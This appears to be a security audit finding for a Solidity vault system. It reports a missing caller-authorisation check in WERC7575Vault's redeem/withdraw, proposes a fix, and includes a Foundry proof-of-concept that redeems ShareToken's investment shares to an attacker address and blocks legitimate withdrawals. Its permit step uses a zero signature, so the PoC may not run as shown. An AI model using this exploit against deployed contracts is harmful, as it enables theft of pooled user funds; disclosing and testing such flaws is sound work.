## Title
Missing Authorization Check in WERC7575Vault Allows Theft of ShareToken's Investment Assets and DOS of Withdrawal Mechanism

## Summary
The `WERC7575Vault.redeem()` and `withdraw()` functions fail to verify that `msg.sender` has permission from the `owner` parameter before redeeming shares. This allows any attacker to call these functions with `owner=ShareToken`, draining the ShareToken's accumulated investment shares and stealing the underlying assets, while also depleting the self-allowance required for legitimate `withdrawFromInvestment()` calls.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/WERC7575Vault.sol` (functions `redeem` at lines 464-467, `withdraw` at lines 434-437, and `_withdraw` at lines 397-411)

**Intended Logic:** According to the function documentation, "msg.sender must be owner OR have allowance for the shares" [1](#0-0) . This is standard ERC-4626 behavior where only authorized parties can redeem shares on behalf of an owner.

**Actual Logic:** The implementation only checks the owner's self-allowance via `_shareToken.spendSelfAllowance(owner, shares)` [2](#0-1)  but never verifies that `msg.sender` has permission from the owner. There is no check for `allowance(owner, msg.sender)` anywhere in the redeem/withdraw flow [3](#0-2) .

**Exploitation Path:**
1. **Setup**: ShareToken accumulates investment shares through the Investment Manager calling `ERC7575VaultUpgradeable.investAssets()` [4](#0-3) , which deposits assets into investment vaults with ShareToken as the receiver (line 1461).

2. **Self-Allowance Granted**: ShareToken obtains self-allowance on the investment share token via validator-signed permit to enable future withdrawals.

3. **Front-Running Attack**: Before the Investment Manager calls `withdrawFromInvestment()` [5](#0-4) , attacker calls:
   ```solidity
   investmentVault.redeem(shares, attackerAddress, address(shareToken))
   ```

4. **Unauthorized Redemption**: The `WERC7575Vault._withdraw()` function [6](#0-5) :
   - Spends ShareToken's self-allowance (line 407)
   - Burns shares from ShareToken (line 408)
   - Sends assets to attacker's address (line 409)
   - Never checks if attacker has authorization from ShareToken

5. **DOS of Legitimate Withdrawals**: When Investment Manager later calls `withdrawFromInvestment()`, it checks for sufficient self-allowance [7](#0-6)  and reverts with `InvestmentSelfAllowanceMissing` because the attacker has already consumed it.

6. **Cascading Failure**: Without the ability to withdraw from investments, the vault cannot fulfill user redemption requests, blocking all users from claiming their assets.

**Security Property Broken:** Violates invariant #12 "No Fund Theft: No double-claims, no reentrancy, no authorization bypass" and invariant #11 "No Role Escalation: Access control boundaries enforced".

## Impact Explanation
- **Affected Assets**: All assets invested in WERC7575Vault investment vaults (USDC, USDT, DAI, etc.) held by the ShareToken contract
- **Damage Severity**: Complete theft of all invested assets. If ShareToken holds $1M in investment vaults, attacker can steal the entire amount in a single transaction
- **User Impact**: All users with pending redemption requests are blocked from claiming their assets due to DOS of `withdrawFromInvestment()`. This affects every user who has requested redemption, as the vault cannot rebalance assets from investments.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged external address can execute this attack
- **Preconditions**: 
  - ShareToken must hold shares in investment vaults (normal state after `investAssets()` calls)
  - ShareToken must have non-zero self-allowance on investment share token (required for normal operations)
- **Execution Complexity**: Single transaction attack. Attacker simply calls `redeem()` with publicly known parameters
- **Frequency**: Can be executed repeatedly until all ShareToken investment shares are drained or self-allowance is depleted

## Recommendation

Add authorization check before allowing redemption on behalf of an owner:

```solidity
// In src/WERC7575Vault.sol, function _withdraw, insert after line 405:

function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
    if (receiver == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    if (owner == address(0)) {
        revert IERC20Errors.ERC20InvalidSender(address(0));
    }
    if (assets == 0) revert ZeroAssets();
    if (shares == 0) revert ZeroShares();
    
    // FIXED: Add authorization check for caller
    if (msg.sender != owner) {
        _shareToken.spendAllowance(owner, msg.sender, shares);
    }
    
    _shareToken.spendSelfAllowance(owner, shares);
    _shareToken.burn(owner, shares);
    SafeTokenTransfers.safeTransfer(_asset, receiver, assets);
    emit Withdraw(msg.sender, receiver, owner, assets, shares);
}
```

This ensures that when `msg.sender != owner`, the caller must have sufficient allowance from the owner, matching standard ERC-4626 behavior and the documented intent.

## Proof of Concept

```solidity
// File: test/Exploit_UnauthorizedInvestmentRedemption.t.sol
// Run with: forge test --match-test test_StealInvestmentAssets -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ERC20Faucet6.sol";
import "../src/WERC7575ShareToken.sol";
import "../src/WERC7575Vault.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Exploit_UnauthorizedInvestmentRedemption is Test {
    WERC7575ShareToken investmentShareToken;
    WERC7575Vault investmentVault;
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable mainVault;
    ERC20Faucet6 usdc;
    
    address owner = address(0x1);
    address investmentManager = address(0x2);
    address validator = address(0x3);
    address attacker = address(0x999);
    uint256 validatorKey = 0x123;
    
    function setUp() public {
        // Deploy USDC
        vm.prank(owner);
        usdc = new ERC20Faucet6("USD Coin", "USDC", 1_000_000_000 * 1e6);
        
        // Deploy investment layer (WERC7575)
        vm.startPrank(owner);
        investmentShareToken = new WERC7575ShareToken("Investment USD", "iUSD");
        investmentVault = new WERC7575Vault(address(usdc), investmentShareToken);
        investmentShareToken.registerVault(address(usdc), address(investmentVault));
        investmentShareToken.setValidator(validator);
        investmentShareToken.setKycAdmin(validator);
        vm.stopPrank();
        
        // Deploy settlement layer (Upgradeable)
        vm.startPrank(owner);
        ShareTokenUpgradeable impl = new ShareTokenUpgradeable();
        bytes memory initData = abi.encodeWithSelector(ShareTokenUpgradeable.initialize.selector, "Vault Shares", "VSHARE", owner);
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        shareToken = ShareTokenUpgradeable(address(proxy));
        
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(ERC7575VaultUpgradeable.initialize.selector, address(usdc), address(shareToken), owner);
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        mainVault = ERC7575VaultUpgradeable(address(vaultProxy));
        
        shareToken.registerVault(address(usdc), address(mainVault));
        shareToken.setInvestmentManager(investmentManager);
        shareToken.setInvestmentShareToken(address(investmentShareToken));
        vm.stopPrank();
        
        // Setup KYC
        vm.startPrank(validator);
        investmentShareToken.setKycVerified(address(shareToken), true);
        investmentShareToken.setKycVerified(attacker, true);
        vm.stopPrank();
        
        // Fund investment manager with USDC and invest
        vm.startPrank(owner);
        usdc.transfer(address(mainVault), 100_000 * 1e6);
        vm.stopPrank();
        
        vm.startPrank(investmentManager);
        mainVault.investAssets(50_000 * 1e6); // Invest 50k USDC
        vm.stopPrank();
        
        // Grant self-allowance to ShareToken (simulating validator permit)
        vm.startPrank(validator);
        investmentShareToken.permit(
            address(shareToken),
            address(shareToken),
            type(uint256).max,
            block.timestamp + 1 days,
            0, bytes32(0), bytes32(0) // Validator signature
        );
        vm.stopPrank();
    }
    
    function test_StealInvestmentAssets() public {
        // VERIFY: ShareToken has investment shares
        uint256 shareTokenInvestmentBalance = investmentShareToken.balanceOf(address(shareToken));
        assertGt(shareTokenInvestmentBalance, 0, "ShareToken should have investment shares");
        
        uint256 attackerBalanceBefore = usdc.balanceOf(attacker);
        
        // EXPLOIT: Attacker calls redeem on behalf of ShareToken (no authorization check!)
        vm.prank(attacker);
        uint256 stolenAssets = investmentVault.redeem(
            shareTokenInvestmentBalance,
            attacker, // receiver = attacker
            address(shareToken) // owner = shareToken (victim)
        );
        
        // VERIFY: Assets stolen
        uint256 attackerBalanceAfter = usdc.balanceOf(attacker);
        assertEq(attackerBalanceAfter - attackerBalanceBefore, stolenAssets, "Attacker stole assets");
        assertGt(stolenAssets, 0, "Stolen amount should be positive");
        
        // VERIFY: ShareToken investment shares drained
        uint256 shareTokenBalanceAfter = investmentShareToken.balanceOf(address(shareToken));
        assertEq(shareTokenBalanceAfter, 0, "ShareToken investment shares drained");
        
        // VERIFY: Legitimate withdrawFromInvestment now fails (DOS)
        vm.prank(investmentManager);
        vm.expectRevert(); // Will revert with InvestmentSelfAllowanceMissing or insufficient shares
        mainVault.withdrawFromInvestment(10_000 * 1e6);
        
        console.log("Attack successful!");
        console.log("Stolen assets:", stolenAssets);
        console.log("ShareToken investment balance:", shareTokenBalanceAfter);
    }
}
```

## Notes

The vulnerability exists because WERC7575Vault is designed as a synchronous investment vault but fails to implement the standard ERC-4626 authorization checks. The dual-layer architecture (settlement + investment) means the ShareToken contract acts as a user of the investment vaults, accumulating shares that should only be redeemable by authorized parties (the main vault acting on behalf of the Investment Manager). The missing authorization check allows anyone to bypass this security model and directly steal the ShareToken's accumulated investment position.

### Citations

**File:** src/WERC7575Vault.sol (L397-411)
```text
    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
        if (receiver == address(0)) {
            revert IERC20Errors.ERC20InvalidReceiver(address(0));
        }
        if (owner == address(0)) {
            revert IERC20Errors.ERC20InvalidSender(address(0));
        }
        if (assets == 0) revert ZeroAssets();
        if (shares == 0) revert ZeroShares();

        _shareToken.spendSelfAllowance(owner, shares);
        _shareToken.burn(owner, shares);
        SafeTokenTransfers.safeTransfer(_asset, receiver, assets);
        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }
```

**File:** src/WERC7575Vault.sol (L425-426)
```text
     * - msg.sender must be owner OR have allowance for the shares
     * - Allows delegation to withdrawal operators
```

**File:** src/WERC7575Vault.sol (L464-467)
```text
    function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {
        assets = previewRedeem(shares);
        _withdraw(assets, shares, receiver, owner);
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1448-1464)
```text
    function investAssets(uint256 amount) external nonReentrant returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        if ($.investmentVault == address(0)) revert NoInvestmentVault();
        if (amount == 0) revert ZeroAmount();

        uint256 availableBalance = totalAssets();
        if (amount > availableBalance) {
            revert ERC20InsufficientBalance(address(this), availableBalance, amount);
        }

        // Approve and deposit into investment vault with ShareToken as receiver
        IERC20Metadata($.asset).safeIncreaseAllowance($.investmentVault, amount);
        shares = IERC7575($.investmentVault).deposit(amount, $.shareToken);

        emit AssetsInvested(amount, shares, $.investmentVault);
        return shares;
```

**File:** src/ERC7575VaultUpgradeable.sol (L1477-1509)
```text
    function withdrawFromInvestment(uint256 amount) external nonReentrant returns (uint256 actualAmount) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        if ($.investmentVault == address(0)) revert NoInvestmentVault();
        if (amount == 0) revert ZeroAmount();

        uint256 balanceBefore = IERC20Metadata($.asset).balanceOf(address(this));

        // Get ShareToken's share balance from the investment ShareToken
        IERC20Metadata investmentShareToken = IERC20Metadata(IERC7575($.investmentVault).share());
        address shareToken_ = $.shareToken;
        uint256 maxShares = investmentShareToken.balanceOf(shareToken_);
        uint256 shares = IERC7575($.investmentVault).previewWithdraw(amount);
        uint256 minShares = shares < maxShares ? shares : maxShares;
        if (minShares == 0) revert ZeroSharesCalculated();

        // Ensure ShareToken has self-allowance on the investment share token for redemption
        uint256 current = investmentShareToken.allowance(shareToken_, shareToken_);
        if (current < minShares) {
            revert InvestmentSelfAllowanceMissing(minShares, current);
        }

        // Redeem shares from ShareToken using our allowance (ShareToken is owner, vault is receiver)
        IERC7575($.investmentVault).redeem(minShares, address(this), shareToken_);

        uint256 balanceAfter = IERC20Metadata($.asset).balanceOf(address(this));
        unchecked {
            actualAmount = balanceAfter - balanceBefore;
        }

        emit AssetsWithdrawnFromInvestment(amount, actualAmount, $.investmentVault);
        return actualAmount;
    }
```
